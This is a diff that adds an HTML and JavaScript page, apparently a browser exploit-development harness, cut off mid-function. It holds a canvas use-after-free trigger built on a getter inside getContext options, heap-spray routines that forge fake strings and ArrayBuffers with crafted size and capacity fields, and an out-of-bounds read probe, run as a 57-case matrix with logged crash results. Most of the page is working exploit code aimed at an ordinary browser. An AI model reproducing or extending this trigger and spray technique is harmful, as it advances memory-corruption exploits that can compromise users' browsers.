@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V908 - Canvas UAF full-52 + matchmedia x3 + OOB matrix</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  h2 { color:#39c5bb; font-size:13px; margin:16px 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  table { border-collapse:collapse; font-size:11px; margin-top:8px; }
+  td,th { border:1px solid #30363d; padding:3px 7px; text-align:left; vertical-align:top; }
+  th { color:#58a6ff; }
+  .crash { color:#ff7b72; }
+  .ok { color:#7ee787; }
+  .skip { color:#d29922; }
+  .hit { color:#ffa657; font-weight:bold; }
+  .bad { color:#ff7b72; font-weight:bold; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V908 - Full-52 isolated + matchmedia x3 + OOB matrix</h1>
+
+<p class="key">
+<b>Three questions, one run:</b>
+<b>(1)</b> Did V680's 45 non-hit configs hide a readable fake? The 52-config sweep
+was one pass in order (heap/GC state varies per index); V907 proved a hit can flip
+(<code>matchmedia</code>). So re-run <b>all 52 isolated</b>, one per load.
+<b>(2)</b> Is <code>matchmedia</code> flaky? It was a V680 hit but a V907 MISS.
+Two extra isolated repeats decide artifact vs flaky (3 total).
+<b>(3)</b> Does save-count mismatch give an OOB read into adjacent heap?
+Trigger saves 0 vs 32 with same-type reclaim (taggers), plus a forged size-9 AB.
+If the stale wrapper reads the reclaimer's current state (V573/V906 model),
+those cases are MISS/CRASH with no leak.
+</p>
+
+<p>
+<b>Design:</b> V680 logic (candidate spray, then 24 tagged 2d contexts
+<code>lineWidth=200..223</code>, then one <code>savedCtx.lineWidth</code> read) with
+V906/V907 harness (one case per page load, last-stage in localStorage, sync beacons,
+auto-advance; a missing DONE with a delayed next START = crash).
+Trigger is V680's: 32 saves (heap stack) for the 52 + repeats; the OOB cases vary saves.
+A <code>SUSPECT</code> (non-tagged number) is followed by 4 extra reads
+(<code>miterLimit/globalAlpha/lineDashOffset/shadowBlur</code> + hex) to catch a
+readable fake.
+</p>
+
+<p>
+Start: <b>?op=auto</b> &nbsp;|&nbsp; one case: <b>?case=style48</b> &nbsp;|&nbsp; clear: <b>?reset=1</b>
+<br>After a crash just reopen <b>?op=auto</b>. Done when the page prints <b>ALL CASES DONE</b>.
+</p>
+
+<h2>Cases (57)</h2>
+<pre>
+#0-12   elem (div/span/canvas/img/video/audio/input/select/textarea/form/template/table/svg) 24x
+#13-14  attrs 24x16, 24x48
+#15-16  style 24x16, 24x48
+#17-20  optsel 8x96, xhr 16, observer 8x32, mutation 8x32
+#21-23  fontface 8, texttracks 8x16, matchmedia 8
+#24-29  headers 8x64, formdata 8x64, datatransfer 8, range 16, selection 8, tokenlist 8x32
+#30-34  rules 1x64, 1x256, urlsp 8x32, 8x96, blob 8x704
+#35-36  text 24x704, 24x1024
+#37-38  imagedata 16x 16x12, 16x11
+#39-44  grad 24x8/20/32/48/64, pattern 24
+#45-46  path 24x64, 24x256
+#47-51  strfake8 24x720, strfake16 24x360, abfake 16x768, abzero 16x768, jsarray 32x95
+#52-53  matchmedia repeats r2, r3 (total 3 runs for matchmedia)
+#54-56  oob-v0 (trigger saves=0, taggers), oob-v32 (trigger saves=32, taggers),
+        oob-ab9 (AB 16x with forged size/cap=9, null buffer, payload 1234.56+i)
+</pre>
+
+<pre id="out">starting...</pre>
+<div id="tbl"></div>
+
+<h2>FINAL RESULTS (2026-11-06, beacons 10068-10182) — always shown, even if localStorage cleared</h2>
+<p class="note">Full-52 isolated (V680 trigger, 32 saves) + 2 extra <code>matchmedia</code> repeats + OOB matrix. 16:31:30-16:45:26 UTC. <b>45 MISS, 12 CRASH, 0 SUSPECT</b> — readable fake is dead (0/57). New hits vs V680 sweep: <code>urlsp96</code> + <code>imagedata-16x12</code> crash at read (`S3-tagged`); single-pass sweep undercounts flaky types. <code>matchmedia</code> flaky: 3/3 crash here vs 0/1 in V907 (4 runs total: 3 crash, 1 miss). Save-count OOB closed: <code>oob-v0</code>/<code>oob-v32</code> MISS, <code>oob-ab9</code> CRASH. Reopen <code>?op=auto</code> to run again; <code>?reset=1</code> clears localStorage only.</p>
+<table>
+<tr><th>case</th><th>result</th><th>detail</th></tr>
+<tr><td>elem-div</td><td class="ok">MISS</td><td>lw=201 (tagged ctx won)</td></tr>
+<tr><td>elem-span</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-canvas</td><td class="ok">MISS</td><td>lw=203 (tagged ctx won)</td></tr>
+<tr><td>elem-img</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-video</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-audio</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-input</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-select</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-textarea</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-form</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-template</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-table</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>elem-svg</td><td class="ok">MISS</td><td>lw=204 (tagged ctx won)</td></tr>
+<tr><td>attrs16</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>attrs48</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>style16</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>style48</td><td class="crash">CRASH</td><td>last=style48:S3-tagged (crash at read)</td></tr>
+<tr><td>optsel</td><td class="ok">MISS</td><td>lw=207 (tagged ctx won)</td></tr>
+<tr><td>xhr</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>observer</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>mutation</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>fontface</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>texttracks</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>matchmedia</td><td class="crash">CRASH</td><td>last=matchmedia:S3-tagged — flaky hit, 3/3 crash in V908 vs MISS in V907</td></tr>
+<tr><td>headers</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>formdata</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>datatransfer</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>range</td><td class="ok">MISS</td><td>lw=203 (tagged ctx won)</td></tr>
+<tr><td>selection</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>tokenlist</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>rules64</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>rules256</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>urlsp32</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>urlsp96</td><td class="crash">CRASH</td><td>last=urlsp96:S3-tagged — NEW hit, V680 called it miss</td></tr>
+<tr><td>blob</td><td class="ok">MISS</td><td>lw=207 (tagged ctx won)</td></tr>
+<tr><td>text704</td><td class="crash">CRASH</td><td>last=text704:S3-tagged (crash at read; was S2 in V907)</td></tr>
+<tr><td>text1024</td><td class="ok">MISS</td><td>lw=206 (tagged ctx won)</td></tr>
+<tr><td>imagedata-16x12</td><td class="crash">CRASH</td><td>last=imagedata-16x12:S3-tagged — NEW hit (768 backing), 16x11 MISS</td></tr>
+<tr><td>imagedata-16x11</td><td class="ok">MISS</td><td>lw=207 (tagged ctx won)</td></tr>
+<tr><td>grad8</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>grad20</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>grad32</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>grad48</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>grad64</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>pattern</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>path64</td><td class="ok">MISS</td><td>lw=205 (tagged ctx won)</td></tr>
+<tr><td>path256</td><td class="ok">MISS</td><td>lw=203 (tagged ctx won)</td></tr>
+<tr><td>strfake8</td><td class="crash">CRASH</td><td>last=strfake8:S3-tagged (crash at read)</td></tr>
+<tr><td>strfake16</td><td class="crash">CRASH</td><td>last=strfake16:S3-tagged (crash at read; was S2 in V907)</td></tr>
+<tr><td>abfake</td><td class="crash">CRASH</td><td>last=abfake:S3-tagged (crash at read)</td></tr>
+<tr><td>abzero</td><td class="crash">CRASH</td><td>last=abzero:S3-tagged (crash at read)</td></tr>
+<tr><td>jsarray</td><td class="ok">MISS</td><td>lw=207 (tagged ctx won)</td></tr>
+<tr><td>mm-r2</td><td class="crash">CRASH</td><td>last=mm-r2:S3-tagged — matchmedia repeat 2</td></tr>
+<tr><td>mm-r3</td><td class="crash">CRASH</td><td>last=mm-r3:S2-candidate — matchmedia repeat 3 (spray-phase)</td></tr>
+<tr><td>oob-v0</td><td class="ok">MISS</td><td>saves=0, lw=207 (tagged ctx won) — same-object model holds</td></tr>
+<tr><td>oob-v32</td><td class="ok">MISS</td><td>saves=32, lw=205 (tagged ctx won) — save-count OOB dead</td></tr>
+<tr><td>oob-ab9</td><td class="crash">CRASH</td><td>last=oob-ab9:S3-tagged — forged size/cap=9, null buffer, crash as expected</td></tr>
+</table>
+<p class="note"><b>Verdict:</b> 0 SUSPECT in 57. Full-52 readable fake dead. Sweep single-pass undercounts flaky 768 types (urlsp96, imagedata-16x12). Save-count OOB dead (oob-v0/v32 MISS).</p>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v908_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v908_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v908_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V908-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 70) : 'none'; }
+function hexOf(x) { var f = new Float64Array(1), u = new Uint32Array(f.buffer); f[0] = x; return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8); }
+function stLast(id, stage) { try { lsSet('last', id + ':' + stage); } catch (e) {} }
+
+/* ---------- UAF trigger (V680-style, parameterized saves) ---------- */
+function trigger(canvas, nsaves) {
+  var saved = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp };
+}
+
+/* ---------- V680 builders (verbatim logic) ---------- */
+var _fb = new Float64Array(1), _fu = new Uint8Array(_fb.buffer);
+function fbytes(v) { _fb[0] = v; return Array.prototype.slice.call(_fu); }
+var Z8 = [0, 0, 0, 0, 0, 0, 0, 0];
+var O8 = [1, 0, 0, 0, 1, 0, 0, 0];  /* m_size=1, m_capacity=1 */
+function w8(ch, idx, bytes) {
+  for (var k = 0; k < bytes.length; k++) {
+    var j = idx + k;
+    if (j >= 0 && j < ch.length) ch[j] = bytes[k] & 255;
+  }
+}
+function w16(ch, idx, bytes) {
+  for (var k = 0; k + 1 < bytes.length; k += 2) {
+    var j = idx + (k >> 1);
+    if (j >= 0 && j < ch.length) ch[j] = ((bytes[k] & 255) | ((bytes[k + 1] & 255) << 8)) & 65535;
+  }
+}
+function strfake(len, bits, lwv) {
+  var ch = new Array(len), i;
+  var fill = (bits === 8) ? 0x41 : 0x0041;
+  for (i = 0; i < len; i++) ch[i] = fill;
+  var lb = fbytes(lwv);
+  if (bits === 8) {
+    w8(ch, 112 - 20, Z8); w8(ch, 120 - 20, O8); w8(ch, 176 - 20, lb);   /* A */
+    w8(ch, 112, Z8);      w8(ch, 120, O8);      w8(ch, 176, lb);        /* B */
+  } else {
+    w16(ch, (112 - 20) / 2, Z8); w16(ch, (120 - 20) / 2, O8); w16(ch, (176 - 20) / 2, lb); /* A */
+    w16(ch, 112 / 2, Z8);        w16(ch, 120 / 2, O8);        w16(ch, 176 / 2, lb);        /* B */
+  }
+  var s = String.fromCharCode.apply(null, ch);
+  try { s.charCodeAt(len - 1); } catch (e) {}   /* force flatten */
+  try { s.indexOf('A'); } catch (e) {}
+  return s;
+}
+function fakeAB(len, lwv) {
+  var ab = new ArrayBuffer(len);
+  try {
+    var t = new Uint32Array(ab, 120, 2);
+    t[0] = 1; t[1] = 1;
+    new Float64Array(ab, 176, 1)[0] = lwv;
+  } catch (e) {}
+  return ab;
+}
+function ab9(len, lwv) {
+  var ab = new ArrayBuffer(len);
+  try {
+    var t = new Uint32Array(ab, 120, 2);
+    t[0] = 9; t[1] = 9;
+    new Float64Array(ab, 176, 1)[0] = lwv;
+  } catch (e) {}
+  return ab;
+}
+
+var KEEP = null;
+function buildEntry(e, helper, helperCanvas) {
+  var t = e.t, n = e.n, a = e.a, out = [], i, j;
+  if (t === 'none') {
+    out = [];
+  } else if (t === 'abzero') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = new ArrayBuffer(a);
+  } else if (t === 'abfake') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = fakeAB(a, 4400.44 + i);
+  } else if (t === 'ab9') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = ab9(a, 1234.56 + i);
+  } else if (t === 'strfake8') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = strfake(a, 8, 5500.55 + i);
+  } else if (t === 'strfake16') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = strfake(a, 16, 6600.66 + i);
+  } else if (t === 'jsarray') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var arr = new Array(a);
+      for (j = 0; j < a; j++) arr[j] = 1.25;
+      out[i] = arr;
+    }
+  } else if (t === 'grad') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var g = helper.createLinearGradient(0, 0, 1, 1);
+      for (j = 0; j < a; j++) {
+        try { g.addColorStop(j / (a - 1), 'rgb(' + ((j * 7) & 255) + ',0,0)'); } catch (e1) {}
+      }
+      out[i] = g;
+    }
+  } else if (t === 'pattern') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = helper.createPattern(helperCanvas, 'repeat'); } catch (e2) { out[i] = null; }
+    }
+  } else if (t === 'path') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var d = 'M0 0';
+      for (j = 0; j < a; j++) d += ' L' + (j & 63) + ' ' + (j & 47);
+      try { out[i] = new Path2D(d); } catch (e3) { out[i] = null; }
+    }
+  } else if (t === 'imagedata') {
+    var wh = String(a).split('x');
+    var w = parseInt(wh[0], 10), h = parseInt(wh[1], 10);
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = helper.createImageData(w, h); } catch (e4) { out[i] = null; }
+    }
+  } else if (t === 'text') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = document.createTextNode('A'.repeat(a)); } catch (e5) { out[i] = null; }
+    }
+  } else if (t === 'elem') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try {
+        out[i] = (a === 'svg')
+          ? document.createElementNS('http://www.w3.org/2000/svg', 'svg')
+          : document.createElement(String(a));
+      } catch (e6) { out[i] = null; }
+    }
+  } else if (t === 'attrs') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var d1 = document.createElement('div');
+      for (j = 0; j < a; j++) d1.setAttribute('a' + j, 'v' + j);
+      out[i] = d1;
+    }
+  } else if (t === 'style') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      var d2 = document.createElement('div');
+      for (j = 0; j < a; j++) d2.style.setProperty('--p' + j, j + 'px');
+      out[i] = d2;
+    }
+  } else if (t === 'optsel') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      var sel = document.createElement('select');
+      for (j = 0; j < a; j++) {
+        var op = document.createElement('option');
+        op.value = 'v' + j; op.textContent = 'o' + j;
+        sel.appendChild(op);
+      }
+      out.push(sel);
+    }
+  } else if (t === 'nodelist') {
+    var box = document.createElement('div');
+    for (j = 0; j < a; j++) box.appendChild(document.createElement('span'));
+    out = [box, box.querySelectorAll('span')];
+  } else if (t === 'mutation') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      var mo = new MutationObserver(function () {});
+      for (j = 0; j < a; j++) {
+        var mel = document.createElement('div');
+        mo.observe(mel, { attributes: true });
+      }
+      out.push(mo);
+    }
+  } else if (t === 'texttracks') {
+    out = [];
+    var vv = document.createElement('video');
+    out.push(vv.textTracks);
+    for (i = 0; i < n; i++) {
+      try { out.push(vv.addTextTrack('subtitles', 't' + i, 'en')); } catch (e12) {}
+    }
+    out.push(vv);
+  } else if (t === 'matchmedia') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      try { out.push(window.matchMedia('(min-width:' + i + 'px)')); } catch (e13) {}
+    }
+  } else if (t === 'headers') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      try {
+        var hd = new Headers();
+        for (j = 0; j < a; j++) hd.set('h' + j, 'v' + j);
+        out.push(hd);
+      } catch (e14) {}
+    }
+  } else if (t === 'formdata') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      try {
+        var fd = new FormData();
+        for (j = 0; j < a; j++) fd.append('f' + j, 'v' + j);
+        out.push(fd);
+      } catch (e15) {}
+    }
+  } else if (t === 'datatransfer') {
+    out = [];
+    for (i = 0; i < n; i++) { try { out.push(new DataTransfer()); } catch (e16) {} }
+  } else if (t === 'range') {
+    out = [];
+    for (i = 0; i < n; i++) { try { out.push(document.createRange()); } catch (e17) {} }
+  } else if (t === 'selection') {
+    out = [];
+    for (i = 0; i < 4; i++) { try { out.push(window.getSelection()); } catch (e18) {} }
+  } else if (t === 'tokenlist') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      var tel = document.createElement('div');
+      for (j = 0; j < a; j++) tel.classList.add('c' + j);
+      out.push(tel.classList);
+    }
+  } else if (t === 'xhr') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) { try { out[i] = new XMLHttpRequest(); } catch (e7) { out[i] = null; } }
+  } else if (t === 'observer') {
+    var els = [];
+    var ro = new ResizeObserver(function () {});
+    for (j = 0; j < a; j++) { var el = document.createElement('div'); ro.observe(el); els.push(el); }
+    out = [ro, els];
+  } else if (t === 'fontface') {
+    out = [];
+    for (i = 0; i < n; i++) {
+      try {
+        var ff = new FontFace('F' + i, 'local(Arial)');
+        document.fonts.add(ff);
+        out.push(ff);
+      } catch (e8) {}
+    }
+  } else if (t === 'rules') {
+    var se = document.createElement('style');
+    document.head.appendChild(se);
+    var sh = se.sheet;
+    for (j = 0; j < a; j++) {
+      try { sh.insertRule('.c' + j + '{color:rgb(' + (j & 255) + ',0,0)}', sh.cssRules.length); } catch (e9) {}
+    }
+    out = [se, sh];
+  } else if (t === 'urlsp') {
+    var pcs = [];
+    for (j = 0; j < a; j++) pcs.push('k' + j + '=v' + j);
+    out = new Array(n);
+    for (i = 0; i < n; i++) { try { out[i] = new URLSearchParams(pcs.join('&')); } catch (e10) { out[i] = null; } }
+  } else if (t === 'blob') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) { try { out[i] = new Blob([new Uint8Array(a)]); } catch (e11) { out[i] = null; } }
+  }
+  KEEP = out;
+  return out;
+}
+
+/* 24 tagged real contexts, V680 detector */
+function tagContexts(n) {
+  var keep = [], made = 0, c;
+  for (c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.lineWidth = 200 + made; } catch (e2) {}
+      keep.push(cc);
+      made++;
+    }
+  }
+  return { keep: keep, made: made };
+}
+
+/* ---------- table (52 V680 + mm repeats + OOB) ---------- */
+var TABLE = [];
+function add(id, t, n, a, saves) { TABLE.push({ id: id, t: t, n: n, a: a, saves: saves }); }
+add('elem-div', 'elem', 24, 'div', 32);
+add('elem-span', 'elem', 24, 'span', 32);
+add('elem-canvas', 'elem', 24, 'canvas', 32);
+add('elem-img', 'elem', 24, 'img', 32);
+add('elem-video', 'elem', 24, 'video', 32);
+add('elem-audio', 'elem', 24, 'audio', 32);
+add('elem-input', 'elem', 24, 'input', 32);
+add('elem-select', 'elem', 24, 'select', 32);
+add('elem-textarea', 'elem', 24, 'textarea', 32);
+add('elem-form', 'elem', 24, 'form', 32);
+add('elem-template', 'elem', 24, 'template', 32);
+add('elem-table', 'elem', 24, 'table', 32);
+add('elem-svg', 'elem', 24, 'svg', 32);
+add('attrs16', 'attrs', 24, 16, 32);
+add('attrs48', 'attrs', 24, 48, 32);
+add('style16', 'style', 24, 16, 32);
+add('style48', 'style', 24, 48, 32);
+add('optsel', 'optsel', 8, 96, 32);
+add('xhr', 'xhr', 16, 0, 32);
+add('observer', 'observer', 8, 32, 32);
+add('mutation', 'mutation', 8, 32, 32);
+add('fontface', 'fontface', 8, 0, 32);
+add('texttracks', 'texttracks', 8, 16, 32);
+add('matchmedia', 'matchmedia', 8, 0, 32);
+add('headers', 'headers', 8, 64, 32);
+add('formdata', 'formdata', 8, 64, 32);
+add('datatransfer', 'datatransfer', 8, 0, 32);
+add('range', 'range', 16, 0, 32);
+add('selection', 'selection', 8, 0, 32);
+add('tokenlist', 'tokenlist', 8, 32, 32);
+add('rules64', 'rules', 1, 64, 32);
+add('rules256', 'rules', 1, 256, 32);
+add('urlsp32', 'urlsp', 8, 32, 32);
+add('urlsp96', 'urlsp', 8, 96, 32);
+add('blob', 'blob', 8, 704, 32);
+add('text704', 'text', 24, 704, 32);
+add('text1024', 'text', 24, 1024, 32);
+add('imagedata-16x12', 'imagedata', 16, '16x12', 32);
+add('imagedata-16x11', 'imagedata', 16, '16x11', 32);
+add('grad8', 'grad', 24, 8, 32);
+add('grad20', 'grad', 24, 20, 32);
+add('grad32', 'grad', 24, 32, 32);
+add('grad48', 'grad', 24, 48, 32);
+add('grad64', 'grad', 24, 64, 32);
+add('pattern', 'pattern', 24, 0, 32);
+add('path64', 'path', 24, 64, 32);
+add('path256', 'path', 24, 256, 32);
+add('strfake8', 'strfake8', 24, 720, 32);
+add('strfake16', 'strfake16', 24, 360, 32);
+add('abfake', 'abfake', 16, 768, 32);
+add('abzero', 'abzero', 16, 768, 32);
+add('jsarray', 'jsarray', 32, 95, 32);
+add('mm-r2', 'matchmedia', 8, 0, 32);
+add('mm-r3', 'matchmedia', 8, 0, 32);
+add('oob-v0', 'none', 0, 0, 0);
+add('oob-v32', 'none', 0, 0, 32);
+add('oob-ab9', 'ab9', 16, 768, 32);
+
+function findEntry(id) { for (var i = 0; i < TABLE.length; i++) if (TABLE[i].id === id) return TABLE[i]; return null; }
+
+/* ---------- cases ---------- */
+function runCase(id) {
+  var e = findEntry(id);
+  if (!e) return { tag: 'SKIP', detail: 'unknown-case' };
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v908canvas = canvas;
+
+  var helperCanvas = document.createElement('canvas');
+  helperCanvas.width = 1; helperCanvas.height = 1;
+  document.body.appendChild(helperCanvas);
+  var helper = null;
+  try { helper = helperCanvas.getContext('2d'); } catch (eH) {}
+  window._v908helper = [helper, helperCanvas];
+
+  var t = trigger(canvas, e.saves);
+  if (!t.saved || !t.bmp) return { tag: 'THROW', detail: 'trigger-failed:inner=' + !!t.saved + ',bmr=' + !!t.bmp };
+  stLast(id, 'S1-trigger');
+
+  var keptLen = 0, berr = null;
+  try { keptLen = buildEntry(e, helper, helperCanvas).length; } catch (eK) { berr = eK.name || 'build-err'; }
+  stLast(id, 'S2-candidate');
+
+  var tk = tagContexts(24);
+  stLast(id, 'S3-tagged');
+
+  var lw = null, le = null;
+  try { lw = t.saved.lineWidth; } catch (er) { le = errOf(er); }
+
+  var base = 't=' + e.t + ',n=' + e.n + ',a=' + e.a + ',saves=' + e.saves + ',kept=' + keptLen + (berr ? ',berr=' + berr : '') + ',made=' + tk.made;
+  if (le) return { tag: 'THROW', detail: base + ',ERR=' + le };
+
+  if (typeof lw === 'number' && lw >= 200 && lw < 200 + tk.made) {
+    return { tag: 'MISS', detail: base + ',lw=' + lw + '(tagged ctx won)' };
+  }
+
+  /* SUSPECT: candidate hit and vector looked readable — read 4 more fields */
+  var extra = '';
+  var names = ['ml', 'ga', 'ldo', 'sb'];
+  var vals = [null, null, null, null];
+  try { vals[0] = t.saved.miterLimit; } catch (e1) { extra += ',ml=ERR:' + errOf(e1); }
+  try { vals[1] = t.saved.globalAlpha; } catch (e2) { extra += ',ga=ERR:' + errOf(e2); }
+  try { vals[2] = t.saved.lineDashOffset; } catch (e3) { extra += ',ldo=ERR:' + errOf(e3); }
+  try { vals[3] = t.saved.shadowBlur; } catch (e4) { extra += ',sb=ERR:' + errOf(e4); }
+  for (var g = 0; g < 4; g++) {
+    if (vals[g] !== null) extra += ',' + names[g] + '=' + vals[g] + ':' + hexOf(vals[g]);
+  }
+  return { tag: 'SUSPECT', detail: base + ',lw=' + lw + ':' + hexOf(lw) + extra };
+}
+
+var SEQUENCE = [];
+for (var qi = 0; qi < TABLE.length; qi++) SEQUENCE.push(TABLE[qi].id);
+
+var EXPECT = {
+  style48: 'CRASH (V680)', text704: 'CRASH (V680)', strfake8: 'CRASH (V680)',
+  strfake16: 'CRASH (V680)', abfake: 'CRASH (V680)', abzero: 'CRASH (V680)',
+  matchmedia: 'CRASH? (V680) vs MISS (V907)', 'mm-r2': 'CRASH?', 'mm-r3': 'CRASH?',
+  'oob-v0': 'MISS (same-object)', 'oob-v32': 'MISS (same-object)',
+  'oob-ab9': 'CRASH (null buffer)'
+};
+
+function appendRes(s) { lsSet('res', (lsGet('res') || '') + s + ';'); }
+function isDone(id) { return (lsGet('done') || ';').indexOf(';' + id + ';') >= 0; }
+function markDone(id) { var d = lsGet('done') || ';'; if (d.indexOf(';' + id + ';') < 0) lsSet('done', d + id + ';'); }
+function nextCase() { for (var i = 0; i < SEQUENCE.length; i++) { if (!isDone(SEQUENCE[i])) return SEQUENCE[i]; } return null; }
+
+function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+function render() {
+  var r = lsGet('res') || '';
+  var rows = r.split(';');
+  var html = '<table><tr><th>case</th><th>expected</th><th>result</th><th>detail</th></tr>';
+  for (var i = 0; i < rows.length; i++) {
+    if (!rows[i]) continue;
+    var p = rows[i].split('|');
+    var cls = (p[1] === 'CRASH') ? 'crash' : (p[1] === 'SUSPECT' ? 'hit' : (p[1] === 'SKIP' ? 'skip' : 'ok'));
+    var det = p[2] || '';
+    var alarm = (p[1] === 'SUSPECT');
+    html += '<tr><td>' + esc(p[0]) + '</td><td>' + esc(EXPECT[p[0]] || '') +
+            '</td><td class="' + cls + '">' + esc(p[1]) + '</td><td' + (alarm ? ' class="bad"' : '') + '>' + esc(det) + '</td></tr>';
+  }
+  html += '</table>';
+  document.getElementById('tbl').innerHTML = html;
+}
+
+async function runOne(id) {
+  bks('START', 'case=' + id + ',run=' + RUN);
+  lsSet('cur', id);
+  lsSet('last', id + ':S0-enter');
+
+  var r;
+  try { r = runCase(id); }
+  catch (e) { r = { tag: 'THROW', detail: 'harness=' + errOf(e) }; }
+
+  appendRes(id + '|' + r.tag + '|' + (r.detail || ''));
+  markDone(id);
+  lsSet('cur', '');
+  lsSet('last', id + ':S9-done');
